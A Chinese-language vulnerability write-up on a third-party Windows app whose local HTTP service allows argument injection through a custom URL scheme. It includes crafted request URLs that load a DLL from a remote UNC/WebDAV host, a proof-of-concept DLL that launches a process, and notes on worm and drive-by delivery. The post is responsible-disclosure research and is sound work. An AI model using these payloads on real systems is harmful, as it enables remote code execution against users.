**作者：0xcc  
公众号：[非尝咸鱼贩](https://mp.weixin.qq.com/s/goqpp6JR9WgmUR1wyiXXrQ "非尝咸鱼贩")**
这个公众号一直都在写 iOS 和 mac 相关的，这一篇来换一换口味。这个问题是某个第三方软件的远程代码执行漏洞，结合了本地 TCP
端口的分析、Windows 的 URL Scheme 机制的知识，已经报给相关厂商进行修复。
* * *
一些 PC 端软件通常会在本地监听固定的端口，通过 http 服务的方式向任意浏览器提供后门调用。虽然方便了网页前端开发，却添加了新的攻击面，甚至产生
Web 层面的安全漏洞。
首先使用 sysinternals 工具包里的 TCPView 可以观察到一个第三方的系统服务在 0.0.0.0 上监听了一个 TCP
端口。当然用系统自带的 netstat 命令也可以。
用 IDA Pro 静态分析后发现这是一个 http 服务：
    C:\Users\haha>curl http://localhost:12345/getinfo -v
    > GET /getinfo HTTP/1.1
    > Host: localhost:11066
    > User-Agent: curl/7.55.1
    > Accept: */*
    >
    * HTTP 1.0, assume close after body
     ftype telnet
由于历史遗留的设计，而 Win32 程序传递 URL（这里需要和 UWP 区分，后者机制不同）是通过命令行参数传递的。
在默认关联应用打开 URL 使用 ShellExecute* 系列函数，而这个函数也可以直接用来运行任意命令。再与 macOS 比较，现在 mac 上
URL 是 URL，命令行是命令行，泾渭分明。
这里给许多第三方应用程序开发者留下了一个坑。假如 URL 处理不当，很容易产生命令行参数注入问题。虽然 ShellExecute 并不像 system
那样支持 shell 命令注入，但结合具体应用程序的业务逻辑，仍然有可能造成远程代码执行。
在本文的例子当中，someapp:// 对应的程序关联如下：
    C:\Program Files\SomeApp\someapp.exe "%1"
回到前文的 pullclientjpg 接口，这时候给 cmd 参数传入一个带引号的字符串将原始的参数闭合：
    http://localhost:12345/pullclientjpg?cmd=%22%20-evilflag%3D%22AAA
将执行：
    C:\Program Files\SomeApp\someapp.exe "someapp://" -evilflag="AAA"
cmd 参数里的引号和空格都被解码后传递给应用程序，除了被截断的 URL 之外，命令行多出来一个 -evilflag 参数。
那么这时候分析 WinMain 函数的调用，逐步走到检查命令行参数的逻辑。如下是其中一部分命令行参数：
-writecookie
-delcookie
-preloadplayermodule
-minidump
-loadmodule
![
](https://images.seebug.org/content/images/2021/04/29fdba31-5d70-4d2d-8db9-60bb9be6e868.png-w331s)
这个 -loadmodule 参数粗暴简单，将对应的字符串传给 LoadLibraryExW 加载运行。因此通过给 someapp://
闭合添加恶意参数，就可以拉起 PC 端应用并加载任意路径的 DLL。
到这里还需要用到 Windows 的一个特性就是 UNC Path。
Windows 系统可以通过 \servername\sharename
的方式访问远程服务器上共享的文件，由操作系统直接处理路径和网络通信，应用程序本身并不需要直接支持相关协议客户端的功能。LoadLibrary 函数便可以通过
UNC 来直接下载并运行远程的动态链接库。
远程共享的协议可以是 SMB 和 WebDAV。由于运营商出于安全考虑在公网上屏蔽了 SMB 相关端口，选择这个协议只在局域网内蠕虫传播有效果。但
WebDAV 可以走 80（或者 443）端口，因此既可以做到主动传播也可以挂马。
串联起来的效果就是，只要给这个服务发送一个构造好的 HTTP 请求，就会拉起客户端，下载运行任意代码。
    http://localhost:12345/pullclientjpg?cmd=someapp://%22%20-loadmodule%20%22%5C%5Cexample.com%5Chaha%5Cevil.dll%22%20%22
DLL 的示例代码如下，弹出对话框假装只是 XSS 而已：
    #include "stdafx.h"
    #include 
    void poc()
    {
      wchar_t wCmd[] = L"C:\\Windows\\System32\\calc.exe";
      MessageBoxA(NULL, "xss!", "alert", MB_ICONEXCLAMATION);
      STARTUPINFO si = { 0 };
      PROCESS_INFORMATION pi = { 0 };
      ZeroMemory(&si, sizeof(si));
      si.cb = sizeof(si);
      ZeroMemory(&pi, sizeof(pi));
      CreateProcessW(NULL, wCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
      ExitProcess(0);
    }
    BOOL APIENTRY DllMain(HMODULE hModule,
      DWORD  ul_reason_for_call,
      LPVOID lpReserved
    )
    {
      switch (ul_reason_for_call)
      {
      case DLL_PROCESS_ATTACH:
        poc();
        break;
      case DLL_THREAD_ATTACH:
      case DLL_THREAD_DETACH:
      case DLL_PROCESS_DETACH:
        break;
      }
      return TRUE;
    }
![
](https://images.seebug.org/content/images/2021/04/b300922a-d76d-46c0-ba3f-15b915b973dc.png-w331s)
把这个 DLL 通过 smb 或者 WebDAV（推荐后者）发布即可。Windows 自带的 IIS 就可以配置 WebDAV
服务器，步骤繁琐，建议使用这个 Python 的实现：https://github.com/wolf71/TinyWebDav
前文提到这个 http 服务是监听在 0.0.0.0 上的。所以攻击向量可以是：
  1. 1-click 的浏览器钓鱼。通过在网页挂马的形式感染受影响的客户端。一个  就可以实现
  2. 0-click 蠕虫传播。在公网和局域网上直接批量扫描对应的端口并执行任意代码
在软件漏洞研究上，无论是攻击还是防御，攻击面都是一个很重要的因素。开发者设计这个功能的初衷可能是为了减少弹窗，提升用户体验，却不巧增加了攻击面。在引入一个功能的时候，不妨多想想带来的风险和功能的实用性是否划算？
这个漏洞可蠕虫可挂马，也利用到了 Windows 的一些特性，算是很典型的通过逆向挖 Web 洞的体验。
出于负责任披露考虑，文中出现的具体端口、字符串等做了模糊化处理。
* * *